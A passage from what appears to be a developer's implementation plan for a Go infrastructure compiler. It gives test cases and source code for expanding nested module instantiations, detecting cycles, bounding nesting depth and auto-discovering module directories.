		t.Errorf("the diagnostic must say the nesting is too deep; got %+v", ds)
	}
	for _, s := range summaries(ds) {
		if strings.Contains(s, "never terminates") || strings.Contains(s, "cycle") {
			t.Fatalf("an acyclic deep tree was reported as a cycle (%q); they are different failures", s)
		}
	}
}

func TestExpandAcceptsNestingExactlyAtMaxDepth(t *testing.T) {
	// The boundary the guard must not move. Without this, `>` and `>=` are
	// indistinguishable and the limit silently becomes 31 or 33.
	decl, dir := fixture(t, chain(MaxDepth))

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("nesting exactly %d deep is within the limit: %+v", MaxDepth, ds)
	}
	if len(exp.Instances) != 1 {
		t.Errorf("got %d instances, want 1", len(exp.Instances))
	}
}

// Amendment 12b: the bound counts INSTANTIATIONS — module boundaries crossed to
// reach a resource — never loads. §8e auto-loads every directory under the
// project root holding a module.yml, so a project with more modules than
// MaxDepth sitting side by side is ordinary and must compile.
//
// This is the discriminating half of the depth pair: chain(MaxDepth+1) above
// must FAIL and this must PASS. An implementation that counted loads passes the
// first and fails this one, which is the only way to tell the two apart — and a
// bound on the module COUNT would be a ceiling no user could predict from their
// nesting.
func TestManySiblingModulesNeverTripTheDepthBound(t *testing.T) {
	const n = MaxDepth + 9
	files := map[string]string{}
	var res strings.Builder
	res.WriteString("project: demo\nresources:\n")
	for i := 0; i < n; i++ {
		files[fmt.Sprintf("m%d/module.yml", i)] = "resources:\n  leaf:\n    type: test.thing\n"
		fmt.Fprintf(&res, "  c%02d:\n    type: module.m%d\n", i, i)
	}
	files["infra.yml"] = res.String()
	decl, dir := fixture(t, files)

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("%d sibling modules are all at depth 1; the bound counts module boundaries "+
			"crossed, not modules loaded: %+v", n, ds)
	}
	if len(exp.Instances) != n {
		t.Errorf("got %d instances, want %d", len(exp.Instances), n)
	}
}

func TestExpandAcceptsADiamondNothingLikeACycle(t *testing.T) {
	// One source instantiated twice on two branches. A visited-set that never
	// popped would call this a cycle.
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./shared
resources:
  left:
    type: module.shared
  right:
    type: module.shared
`,
		"shared/module.yml": "resources:\n  thing:\n    type: test.thing\n",
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("instantiating one source twice is not a cycle: %+v", ds)
	}
	if len(exp.Instances) != 2 {
		t.Errorf("got %d instances, want 2 — one per instantiation", len(exp.Instances))
	}
}

func TestExpandRefusesAnInstantiationOfAnUnloadedModule(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": "project: demo\nresources:\n  prod:\n    type: module.app_stack\n",
	})

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if !hasFragment(ds, "no module named \"app_stack\" is loaded") {
		t.Errorf("instantiating a module that no `modules:` entry loads must be refused; got %+v", ds)
	}
}

// A syntax error inside a module file must say WHICH instantiation it came
// from. Ruling 7 makes Origin.Module the only way an error message can, and one
// module instantiated twice would otherwise produce two identical diagnostics a
// reader cannot tell apart.
func TestADiagnosticFromInsideAModuleNamesTheInstantiation(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./modules/net
resources:
  net1:
    type: module.net
`,
		"modules/net/module.yml": "resources:\n  subnet:\n    type: 17\n",
	})

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if !ds.HasErrors() {
		t.Fatal("a non-string `type:` must be refused by the module decoder")
	}
	var stamped bool
	for _, d := range ds {
		if strings.Join(d.Origin.Module, ".") == "net1" {
			stamped = true
		}
	}
	if !stamped {
		t.Error("every diagnostic from a nested load must be stamped with the INSTANTIATION " +
			"it came from — `net1`, the resource name, not `net`, the loaded module's name")
	}
}
```

#### 4.2 Run them, see them fail

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 ./internal/modules/
```

Expect a build failure: the package does not exist — `undefined: Expand`, `undefined:
MaxDepth`, `undefined: TypePrefix`, `undefined: Instance`.

#### 4.3 The walk

Create `internal/modules/expand.go`:

```go
// Package modules implements compiler stage 5: it loads module sources, finds
// each instantiation, evaluates its inputs in the CALLER's scope, instantiates
// the module's resources under module-qualified addresses, and collects its
// outputs (spec §7 stage 5; PLAN.md §11).
//
// After this stage nothing downstream knows modules exist (spec §7.2). The
// planner, graph, state and executor see a flat set of resources whose
// addresses happen to carry a module path. That simplification is paid for in
// two places, and both are deliberate: diagnostics depend on Origin.Module to
// say which instantiation a problem came from, and a resource's address is
// coupled to the module it lives in, so MOVING A RESOURCE BETWEEN MODULES
// RENAMES IT — which the planner reads as a destroy and a create, not a move.
// There is no `state mv` in Phase 1 (spec §5.2). Restructure modules before a
// resource holds data you cannot lose.
//
// This package never touches a yaml.Node. Stage 2 is the only stage permitted
// to (spec §7), so following a source means re-entering config.LoadModule and
// config.DecodeModule rather than reading a scalar out of a node here
// (Ruling 2).
//
// It never PARSES a source: stage 2 does, and owns the diagnostics for a
// missing pin, a refused scheme and `ext::` (Amendment 15b). Stage 5 receives a
// parsed source.Source and resolves it through the injected Resolver, handling
// only that resolution's own failures.
//
// Resolution happens mid-walk rather than upfront, because a nested module's own
// `modules:` list is not discoverable until that module is loaded. That makes
// this stage impure, against spec §7's "each stage is a pure function" — so the
// impurity is confined to one injected interface, which is what §7's purity was
// protecting (each stage tested in isolation) rather than the letter of it.
package modules

import (
	"path/filepath"
	"strconv"
	"strings"

	"github.com/infrata/infrata/internal/config"
	"github.com/infrata/infrata/internal/diag"
	"github.com/infrata/infrata/internal/variables"
	"github.com/infrata/infrata/pkg/value"
)

// MaxDepth bounds module nesting at 32 instantiations (spec §7.2). The root
// project is depth 0; a module instantiated from the root is depth 1.
//
// IT COUNTS INSTANTIATIONS, NEVER LOADS (Amendment 12b) — how many module
// boundaries you cross to reach a resource, not how many modules a project has.
// §8e auto-loads every directory under the project root holding a module.yml, so
// a project with forty side-by-side modules has forty loaded and a depth of one.
// A bound that counted loads would turn a project's module COUNT into a compile
// failure: a ceiling no user could predict from their nesting. Enforced
// structurally rather than by care — w.path is pushed only in instantiate, and
// loadModules never touches it.
//
// The bound exists so that a pointlessly deep tree — a mistake the cycle check
// cannot see, because it is not a cycle — fails with a diagnostic rather than by
// exhausting the goroutine stack.
const MaxDepth = 32

// TypePrefix marks a resource as a module instantiation (PLAN.md §11, §8c).
//
// A resource type is already `<provider>.<resource>`, so `module.app_stack` is
// well-formed in the shape the language already has: a module behaves as a
// pseudo-provider named `module`. There is no second field and therefore no
// "both set"/"neither set" pair to validate, which is why this spelling was
// chosen over a separate `module:` key.
const TypePrefix = "module."

// Instance is one resource, flattened out of the module tree.
//
// Decl is a COPY owned by this instance, never stage 2's declaration: one
// source instantiated twice must not produce two instances sharing a struct
// that Task 6 then stamps with two different module paths. Task 6 makes the
// copy; until then the field holds what the walk found.
type Instance struct {
	Decl *config.ResourceDecl
}

// Expansion is stage 5's output: a flat resource set, and nothing in it that
// knows modules exist.
type Expansion struct {
	// Project is the ROOT project name. It reaches ResolvedConfig.Project and
	// from there schema.DefaultContext.Project, which provider default
	// resolvers consume — so every resource inside a module needs it for its
	// defaults to resolve.
	//
	// Carried here, once per compilation, rather than passed as a parameter a
	// future caller could vary per instantiation: there is exactly one project
	// name and a module never has its own. config.ModuleFile must never gain a
	// `Project` field for the same reason `project:` in a module file is
	// rejected — the decoder has no case for it, so the field would be one
	// nothing ever fills.
	Project string
	// Resolutions is every remote module source this walk resolved, deduplicated
	// and sorted. It is what a command permitted to mutate the project directory
	// writes to modules.lock (Amendment 18) — stage 5 COLLECTS and never writes.
	//
	// Collected rather than written per Resolve call for the reason M4 already
	// paid for at ae1e309: a file created and populated in two steps is readable
	// in between, so a walk that then fails on a cycle, the depth bound or a
	// refused source would leave a lock recording half a resolution as though it
	// were complete. internal/state/lock.go fixed that shape once; a new
	// artifact must not reintroduce it.
	//
	// Stage 5 is the only component that CAN collect the full set: a nested
	// module's `modules:` list is not knowable until that module is loaded, so
	// nothing upstream of the walk has seen every source.
	Resolutions []Resolved
	Instances   []Instance
}

// Resolved is one module source and what it resolved to.
//
// The Source is carried alongside the Resolution because a Resolution alone
// ({Dir, Commit}) does not say WHICH source produced it, and modules.lock is
// keyed by source identity — not by the name a module was loaded under, which
// differs between levels and between projects.
type Resolved struct {
	Source     source.Source
	Resolution source.Resolution
}

// level is one place resources and modules are declared: the root project, or
// one module file.
//
// config.ProjectDecl and config.ModuleFile are deliberately different types —
// that is what makes a module's keys and a project's keys distinguishable by
// construction rather than by validation (Amendment 1) — and the walk over them
// is identical. Narrowing them to one shape HERE, at the two call sites that
// know which they hold, keeps the walk from asking which kind of file it is at
// every step.
type level struct {
	Inputs    []config.VariableDecl // empty at the root
	Loads     []config.ModuleLoadDecl
	Resources []*config.ResourceDecl
	Outputs   []config.OutputDecl // empty at the root
	Origin    value.Origin
}

func rootLevel(p *config.ProjectDecl) level {
	return level{Loads: p.Modules, Resources: p.Resources, Origin: p.Origin}
}

func moduleLevel(m *config.ModuleFile) level {
	return level{
		Inputs:    m.Inputs,
		Loads:     m.Modules,
		Resources: m.Resources,
		Outputs:   m.Outputs,
		Origin:    m.Origin,
	}
}

// frame is one entry on the current instantiation path.
type frame struct {
	name   string // the INSTANTIATION's name — the resource, not the loaded module
	source string // `source:` exactly as written, for the diagnostic
	dir    string // the resolved absolute directory, the cycle key
}

// walker carries the state the recursion needs and the output it accumulates.
type walker struct {
	root string // the project directory, for rendering paths in diagnostics
	// resolve is the ONE place internal/modules can reach the network. See
	// Resolver's doc comment for why it is injected rather than constructed.
	resolve Resolver
	path    []frame // the CURRENT instantiation path; pushed and popped
	// resolved is keyed by source identity, so one source loaded under two
	// names is one entry.
	resolved  map[string]Resolved
	instances []Instance
	ds        *diag.Diagnostics
}

// Expand is compiler stage 5.
//
// CONTRACT, matching compiler.Compile's: the returned Expansion is meaningless
// if the returned diagnostics contain errors. It holds whatever the walk
// managed to collect, which for a broken module tree is a SUBSET of the
// project's resources — and a subset of desired state diffed against a full
// state file is exactly what invariant 1 reads as "removed from
// configuration". Check HasErrors() before touching it.
func Expand(project *config.ProjectDecl, scope variables.Scope, dir string, resolve Resolver) (*Expansion, diag.Diagnostics) {
	var ds diag.Diagnostics

	abs, err := filepath.Abs(dir)
	if err != nil {
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "cannot resolve the project directory " + strconv.Quote(dir),
			Detail:   err.Error(),
			Action:   "Run the command from a directory that exists.",
		})
		return &Expansion{}, ds
	}

	w := &walker{root: abs, resolve: resolve, ds: &ds}
	w.expand(rootLevel(project), scope, abs, nil)
	return &Expansion{
		Project:     project.Project,
		Resolutions: w.sortedResolutions(),
		Instances:   w.instances,
	}, ds
}

// expand walks one level: it records that level's plain resources, then
// instantiates each module call in turn.
//
// module is the instantiation path to this level, outermost first, empty at the
// root. It names the level in diagnostics here; Task 6 turns it into an address.
func (w *walker) expand(lv level, vars variables.Scope, dir string, module []string) {
	loaded := w.loadModules(lv, dir, module)

	// Stage 2 sorted Resources by name, so this walk is deterministic. It is
	// NOT the final order — Task 6 sorts the whole expansion by address, once,
	// at the end. Sorting here would be the twelfth redundant sort in this tree
	// and would be undone by the next append.
	for _, r := range lv.Resources {
		if strings.HasPrefix(r.Type, TypePrefix) {
			continue
		}
		w.instances = append(w.instances, Instance{Decl: r})
	}

	// Task 7 replaces this with a topological order over sibling references,
	// which degenerates to name order when there are none.
	for _, r := range lv.Resources {
		if !strings.HasPrefix(r.Type, TypePrefix) {
			continue
		}
		w.instantiate(r, loaded, vars, dir, module)
	}
}

// loadedModule is one module made available under a name at one level.
type loadedModule struct {
	Name string
	Dir  string // resolved, absolute — the cycle key
	// Source is DISPLAY TEXT, not a source.Source: every use of it is a
	// diagnostic, and a discovered module has no written source at all. Keeping
	// the parsed type here as well would be two spellings of one concept.
	Source string
	Origin value.Origin
}

// loadModules resolves this level's `modules:` list into a name table.
//
// Names are derived by stage 2 (§8d) and read here; deriving them a second time
// would be two spellings of one rule. At the root, discovered modules are
// folded in too — see discover.go.
func (w *walker) loadModules(lv level, dir string, module []string) map[string]loadedModule {
	out := map[string]loadedModule{}

	if len(module) == 0 {
		for _, m := range w.discover(dir) {
			out[m.Name] = m
		}
	}

	for _, ld := range lv.Loads {
		// Resolve, never Parse. Stage 2 parsed this and reported a missing pin,
		// a refused scheme or `ext::` with the line number (Amendment 15b);
		// re-parsing here would double-report every bad source. Only Resolve's
		// OWN failures — I/O, auth, a missing ref, a corrupt cache — belong to
		// stage 5.
		res, resolveDiags := w.resolve.Resolve(ld.Source, dir)
		w.ds.Extend(resolveDiags)
		if resolveDiags.HasErrors() {
			continue
		}
		// COLLECTED, never written (Amendment 18). See Expansion.Resolutions
		// for why writing per call is the M4 lock-file defect in a new file.
		w.record(ld.Source, res)
		// An explicit `modules:` entry beats a discovered one silently — §7's
		// "explicit config always wins over an implicit default", and §8e names
		// this as the one case where a name collision is NOT an error.
		out[ld.Name] = loadedModule{
			Name:   ld.Name,
			Dir:    filepath.Clean(res.Dir),
			Source: ld.Source.String(),
			Origin: ld.SourceOrigin,
		}
	}
	return out
}

// instantiate expands one module call: it resolves the type to a loaded module,
// checks the two guards, re-enters stages 1 and 2 through the module loader,
// and recurses.
func (w *walker) instantiate(
	r *config.ResourceDecl, loaded map[string]loadedModule,
	vars variables.Scope, dir string, module []string,
) {
	lm, ok := w.resolveCall(r, loaded, module)
	if !ok {
		return
	}

	// ORDER IS LOAD-BEARING: the cycle check runs first. A cycle is infinitely
	// deep, so a depth check placed above it would report every cycle as
	// excessive nesting and make the cycle diagnostic unreachable.
	if at := w.onPath(lm.Dir); at >= 0 {
		w.ds.Add(w.cycleDiagnostic(at, r, lm))
		return
	}
	if len(w.path) >= MaxDepth {
		w.ds.Add(w.depthDiagnostic(r, lm))
		return
	}

	// LoadModule/DecodeModule, not config.Load/config.Decode: a module has no
	// variables.yml, no environments/ and no `project:`, and the project loader
	// would pull all three into a module (Ruling 2, refined by Amendment 1).
	// Stage 5 still never sees a yaml.Node.
	file, err := config.LoadModule(lm.Dir)
	if err != nil {
		w.ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "cannot load module " + strconv.Quote(lm.Name),
			Detail: "`" + lm.Source + "` resolves to " + w.show(lm.Dir) + ", and " + err.Error() +
				".\n\nA module source is a directory holding " + config.ModuleFileName + ".",
			Action: "Correct the `modules:` entry, or create " +
				filepath.ToSlash(filepath.Join(lm.Source, config.ModuleFileName)) + ".",
			Origin: lm.Origin,
		})
		return
	}

	inner := make([]string, len(module)+1)
	copy(inner, module)
	// The INSTANTIATION's name, not the loaded module's: two calls to one
	// module must be tellable apart, and the resource name is what the user
	// chose per call.
	inner[len(module)] = r.Name

	child, decodeDiags := config.DecodeModule(file)
	// Stamped with the instantiation path before they are collected. A module
	// file's own diagnostics carry its file and line, which is not enough: one
	// file instantiated twice produces two identical messages, and Ruling 7
	// makes Origin.Module the only thing that tells them apart.
	w.ds.Extend(inModulePath(decodeDiags, inner))
	if decodeDiags.HasErrors() {
		// A module whose own file did not decode has no usable declarations.
		// Recursing would report every consequence of the syntax error as a
		// second, worse-told problem.
		return
	}

	w.path = append(w.path, frame{name: r.Name, source: lm.Source, dir: lm.Dir})
	// The path is the CURRENT branch, not everything visited: popping is what
	// lets one source be instantiated twice on two branches, an ordinary
	// diamond and not a cycle.
	defer func() { w.path = w.path[:len(w.path)-1] }()

	w.expand(moduleLevel(child), vars, lm.Dir, inner)
}

// resolveCall turns a `module.<name>` type into the module it names, applying
// §8c's two shape guards.
func (w *walker) resolveCall(
	r *config.ResourceDecl, loaded map[string]loadedModule, module []string,
) (loadedModule, bool) {
	// The two SHAPE guards Amendment 8c described — `module.` with nothing after
	// it, and a name containing a further `.` — are NOT here. Author A's
	// checkResourceType (stage 2) owns them, and that is the right place:
	// stage 2 holds the line number, and a malformed type is a property of the
	// text. A stage-5 copy would select `module.` by prefix, find an empty or
	// dotted name, and report that some module does not exist — a diagnostic
	// about a CONSEQUENCE, naming a module name the user never wrote
	// (Amendment 13b). Compile halts after decode errors, so a malformed type
	// never reaches here.
	name := strings.TrimPrefix(r.Type, TypePrefix)

	lm, ok := loaded[name]
	if !ok {
		w.ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "no module named " + strconv.Quote(name) + " is loaded",
			Detail: "Resource " + strconv.Quote(r.Name) + " in " + where(module) +
				" instantiates it.\n\nLoaded here:\n  " + strings.Join(loadedNames(loaded), "\n  "),
			Action: "Add it under `modules:`, or correct the name. A module in a directory holding " +
				config.ModuleFileName + " under the project root is loaded automatically.",
			Origin: r.Origin,
		})
		return loadedModule{}, false
	}
	return lm, true
}

// record keeps one resolution for modules.lock.
//
// KindPath sources are skipped: a local path has no revision to pin, which is
// the same fact 10a leans on when it requires a pin on remote sources and not
// on these. One fact, one consequence, in one place. If Author D wants paths in
// the file too, this condition is the only thing that changes.
//
// Keyed by source identity rather than by the name the module was loaded under:
// one source loaded under two names is one lock entry, and two names for one
// source must not produce two.
func (w *walker) record(s source.Source, res source.Resolution) {
	if s.Kind == source.KindPath {
		return
	}
	if w.resolved == nil {
		w.resolved = map[string]Resolved{}
	}
	w.resolved[s.String()] = Resolved{Source: s, Resolution: res}
}

// sortedResolutions returns the collected resolutions in a stable order.
//
// Sorted because modules.lock is COMPARED against on every later run — an
// existing entry that differs is an error, never a silent update — so a file
// whose lines reorder between identical runs would report a change that did not
// happen. That is invariant 6 reaching an artifact outside the plan. The map it
// reads from is keyed by source identity and Go's map iteration is randomised,
// so this sort is load-bearing rather than defensive.
func (w *walker) sortedResolutions() []Resolved {
	if len(w.resolved) == 0 {
		return nil
	}
	out := make([]Resolved, 0, len(w.resolved))
	for _, r := range w.resolved {
		out = append(out, r)
	}
	sort.Slice(out, func(i, j int) bool {
		return out[i].Source.String() < out[j].Source.String()
	})
	return out
}

// onPath returns the index of dir on the current instantiation path, or -1.
func (w *walker) onPath(dir string) int {
	for i, f := range w.path {
		if f.dir == dir {
			return i
		}
	}
	return -1
}

// show renders an absolute directory relative to the project, so a diagnostic
// prints modules/net rather than /tmp/TestX123/modules/net.
func (w *walker) show(dir string) string {
	rel, err := filepath.Rel(w.root, dir)
	if err != nil {
		return dir
	}
	return filepath.ToSlash(rel)
}

// cycleDiagnostic renders the cycle in participation order with the wrap
// included — `alpha (./a) -> beta (../b) -> gamma (../a)` — the shape
// internal/environments and graph.Layers use, so the three cycle errors in this
// system read alike (spec §7.4).
//
// Each step is `instantiation (source as written)` rather than a bare path: the
// same directory is spelled differently from different levels, so a chain of
// raw sources would end in a string the reader cannot match against its start.
// The sentence beneath names the repeated directory once.
func (w *walker) cycleDiagnostic(at int, r *config.ResourceDecl, lm loadedModule) diag.Diagnostic {
	steps := make([]string, 0, len(w.path)-at+1)
	for _, f := range w.path[at:] {
		steps = append(steps, f.name+" ("+f.source+")")
	}
	steps = append(steps, r.Name+" ("+lm.Source+")")

	return diag.Diagnostic{
		Severity: diag.SeverityError,
		Summary:  "module instantiation forms a cycle",
		Detail: strings.Join(steps, " -> ") + "\n\n" + strconv.Quote(r.Name) + " instantiates " +
			w.show(lm.Dir) + ", which is already being expanded, so expanding it never terminates.",
		Action: "Remove one instantiation so the chain ends at a module that instantiates nothing.",
		Origin: r.Origin,
	}
}

// depthDiagnostic is the OTHER failure, and says so in different words. A tree
// that is merely deep is not one that never terminates, and telling a user with
// a 40-deep tree to look for a cycle sends them where there is nothing to find.
func (w *walker) depthDiagnostic(r *config.ResourceDecl, lm loadedModule) diag.Diagnostic {
	var from string
	if len(w.path) > 0 {
		from = ", instantiated from " + strconv.Quote(w.path[len(w.path)-1].name)
	}
	return diag.Diagnostic{
		Severity: diag.SeverityError,
		Summary:  "module nesting is deeper than " + strconv.Itoa(MaxDepth) + " instantiations",
		Detail: "Expanding " + strconv.Quote(r.Name) + from + " would be instantiation number " +
			strconv.Itoa(len(w.path)+1) + ". Nesting is bounded so that a mistake in a `modules:` " +
			"entry fails here rather than by exhausting the stack.\n\nThis is not a cycle: no " +
			"module on the path instantiates itself.",
		Action: "Flatten the module tree, or inline the innermost modules into their callers.",
		Origin: r.Origin,
	}
}

// inModulePath stamps diagnostics with a whole instantiation path, folding
// Task 9's single-level InModule from the innermost element outward. Same shape
// as addressIn (Task 6) and originInPath, and for the same reason: InModule
// prepends and copies, so folding it builds the full path with no slice shared
// between two diagnostics.
func inModulePath(ds diag.Diagnostics, module []string) diag.Diagnostics {
	for i := len(module) - 1; i >= 0; i-- {
		ds = ds.InModule(module[i])
	}
	return ds
}

// loadedNames lists what is loaded at a level, sorted, for a diagnostic. Go's
// map iteration is randomised and such a list must not reorder itself between
// runs of the same configuration.
func loadedNames(loaded map[string]loadedModule) []string {
	out := make([]string, 0, len(loaded))
	for name := range loaded {
		out = append(out, name)
	}
	if len(out) == 0 {
		return []string{"(none)"}
	}
	sort.Strings(out)
	return out
}

// where names a level for a diagnostic. Ruling 7: an error message's only way
// to say which instantiation a problem came from is the module path.
func where(module []string) string {
	if len(module) == 0 {
		return "the project"
	}
	return "module " + strings.Join(module, ".")
}
```

Add `"sort"` to the imports.

#### 4.4 Run them, see them pass

```bash
go test -count=1 ./internal/modules/
```

`TestExpandRecursesThroughNestedInstantiations` will still fail until step 4.6 —
`discover` does not exist. Comment out the `w.discover(dir)` loop if you want a green
run first; restore it in 4.6.

#### 4.5 The registry guard

§8c's third guard. In `internal/registry/registry.go`, inside `Register`'s FIRST loop,
after `d.Validate()`:

```go
		if strings.HasPrefix(d.Type, "module.") {
			// Compiler stage 5 selects module instantiations by this prefix
			// (PLAN.md §11). A provider claiming the namespace would turn a
			// user's `type: module.app_stack` into a silently shadowed provider
			// resource — a plan that is wrong and looks fine.
			//
			// Belt-and-braces: stage 5 runs before stage 7, so a module type
			// from a user's config is always expanded away before
			// Definition() is reached. What this stops is the provider side,
			// and it stops it at startup in that provider's own tests.
			//
			// In the FIRST loop with the other two checks, because that loop is
			// deliberately validate-before-mutate: a failed registration must
			// leave the registry untouched.
			return fmt.Errorf("provider %s: resource type %q is reserved: the `module.` namespace "+
				"is how configuration instantiates a module", p.Name(), d.Type)
		}
```

Add `"strings"` to that file's imports, and this to `internal/registry/registry_test.go`:

```go
func TestRegisterRefusesTheModuleNamespace(t *testing.T) {
	r := New()
	err := r.Register(&fakeProvider{name: "rogue", defs: []*schema.ResourceDefinition{
		{Type: "module.app_stack", Attributes: map[string]*schema.AttributeSchema{
			"name": {Type: value.KindString, Required: true},
		}},
	}})
	if err == nil {
		t.Fatal("a provider claiming `module.` would silently shadow every module call " +
			"of that name")
	}
	if !strings.Contains(err.Error(), "reserved") {
		t.Errorf("error = %q, want it to say the namespace is reserved", err)
	}
	if _, ok := r.Definition("module.app_stack"); ok {
		t.Error("a failed registration must leave the registry untouched")
	}
}
```

Use whatever fake provider `registry_test.go` already defines rather than adding one.

#### 4.6 Discovery

§8e. Create `internal/modules/discover.go`:

```go
package modules

import (
	"io/fs"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/infrata/infrata/internal/config"
	"github.com/infrata/infrata/internal/diag"
)

// skipDirs are never descended into. `.git` holds thousands of files and no
// modules; `.infra` holds state and the module cache, and descending into the
// cache would load every module a project has ever fetched under a name taken
// from a content hash.
var skipDirs = map[string]bool{".git": true, ".infra": true}

// discover finds every directory under the project root holding a module.yml
// and makes it available under its directory name (PLAN.md §11, §8e).
//
// ROOT ONLY. A module's own dependencies come from its own `modules:` list, not
// from whatever directories happen to lie around the project that vendored it —
// otherwise a module works in one project and not the next, which is the
// opposite of what a module is for. loadModules enforces this by calling
// discover only when the module path is empty.
func (w *walker) discover(root string) []loadedModule {
	byName := map[string]loadedModule{}
	var order []string

	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if !d.IsDir() {
			return nil
		}
		if path != root && skipDirs[d.Name()] {
			return fs.SkipDir
		}
		// Symlinks are not followed: WalkDir does not follow them, and that is
		// the behaviour wanted here rather than an accident to work around. A
		// symlink out of the project root would load a module from outside the
		// repository, which is a source the user never wrote down.
		if _, statErr := os.Stat(filepath.Join(path, config.ModuleFileName)); statErr != nil {
			return nil
		}
		name := moduleName(d.Name())
		if prior, dup := byName[name]; dup {
			w.ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "two directories both define a module named " + strconv.Quote(name),
				Detail: w.show(prior.Dir) + " and " + w.show(path) +
					" each hold a " + config.ModuleFileName + ", and both derive the same name.",
				Action: "Add one of them to `modules:` with an explicit `name:`, or rename a directory.",
			})
			return nil
		}
		rel, relErr := filepath.Rel(root, path)
		if relErr != nil {
			return nil
		}
		byName[name] = loadedModule{
			Name: name,
			Dir:  path,
			// A display string, not a source.Source: a discovered module was
			// never written down, so there is no source to parse and nothing
			// for Resolve to do. loadedModule.Source is what diagnostics print,
			// which is why it is a string here and at the explicit sites alike.
			Source: "./" + filepath.ToSlash(rel),
		}
		order = append(order, name)
		return nil
	})
	if err != nil {
		w.ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "cannot scan the project for modules",
			Detail:   err.Error(),
			Action:   "Check the project directory is readable.",
		})
		return nil
	}

	// WalkDir visits lexically, so `order` is already deterministic and needs
	// no sort — the collision diagnostic above depends on that: which of two
	// colliding directories is called "prior" must not change between runs.
	out := make([]loadedModule, 0, len(order))
	for _, name := range order {
		out = append(out, byName[name])
	}
	return out
}

// moduleName normalises a directory name to an identifier (§8d): `-` becomes
// `_`. The `:ref` and `.git` trimming §8d also describes belongs to a SOURCE
// string, which stage 2 handles; a directory name has neither.
func moduleName(base string) string {
	return strings.ReplaceAll(base, "-", "_")
}
```

Create `internal/modules/discover_test.go`:

```go
package modules

import (
	"strings"
	"testing"

	"github.com/infrata/infrata/internal/variables"
)

func TestADirectoryHoldingAModuleFileIsLoadedWithoutAModulesEntry(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": "project: demo\nresources:\n  prod:\n    type: module.networking\n",
		// No `modules:` entry at all.
		"modules/networking/module.yml": "resources:\n  vpc:\n    type: test.thing\n",
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("a module.yml under the project root is loaded automatically: %+v", ds)
	}
	if len(exp.Instances) != 1 || exp.Instances[0].Decl.Name != "vpc" {
		t.Fatalf("instances = %+v, want the discovered module's one resource", exp.Instances)
	}
}

func TestDiscoveryNormalisesHyphensToUnderscores(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml":                  "project: demo\nresources:\n  prod:\n    type: module.app_stack\n",
		"modules/app-stack/module.yml": "resources:\n  svc:\n    type: test.thing\n",
	})

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("`app-stack` must be loadable as `module.app_stack`: %+v", ds)
	}
}

// §8e's one exception to the collision rule.
func TestAnExplicitModulesEntryBeatsADiscoveredOneSilently(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - name: net
    source: ./vendor/net
resources:
  prod:
    type: module.net
`,
		"net/module.yml":        "resources:\n  discovered:\n    type: test.thing\n",
		"vendor/net/module.yml": "resources:\n  explicit:\n    type: test.thing\n",
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("explicit beating implicit is not a collision (§7, §8e): %+v", ds)
	}
	// The assertion that matters: WHICH one won. A test that only counted
	// instances would pass with either.
	if len(exp.Instances) != 1 || exp.Instances[0].Decl.Name != "explicit" {
		t.Fatalf("instances = %+v, want the explicitly loaded module's resource — "+
			"§7: explicit config always wins over an implicit default", exp.Instances)
	}
}

func TestTwoDiscoveredDirectoriesWithOneNameAreRefused(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml":        "project: demo\nresources:\n  prod:\n    type: module.net\n",
		"a/net/module.yml": "resources:\n  one:\n    type: test.thing\n",
		"b/net/module.yml": "resources:\n  two:\n    type: test.thing\n",
	})

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if !hasFragment(ds, "two directories both define a module named \"net\"") {
		t.Errorf("two discovered modules deriving one name must be refused, never resolved "+
			"by order; got %+v", ds)
	}
	if !hasFragment(ds, "a/net") || !hasFragment(ds, "b/net") {
		t.Errorf("the diagnostic must name BOTH directories; got %+v", ds)
	}
}

func TestDiscoverySkipsDotDirectories(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml":                          "project: demo\nresources:\n  prod:\n    type: module.real\n",
		"real/module.yml":                    "resources:\n  r:\n    type: test.thing\n",
		".infra/modules/abc123/net/module.yml": "resources:\n  cached:\n    type: test.thing\n",
		".git/hooks/net/module.yml":            "resources:\n  bogus:\n    type: test.thing\n",
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}
	for _, inst := range exp.Instances {
		if inst.Decl.Name == "cached" || inst.Decl.Name == "bogus" {
			t.Fatalf("%q came from a skipped directory; the module cache holds every module "+
				"this project has ever fetched, under names taken from content hashes", inst.Decl.Name)
		}
	}
}

func TestDiscoveryDoesNotReachInsideAModule(t *testing.T) {
	// A module's dependencies come from its own `modules:` list. If discovery
	// applied at every level, a module would resolve a name against whatever
	// directories the CONSUMING project happens to contain, and would work in
	// one project and fail in the next.
	decl, dir := fixture(t, map[string]string{
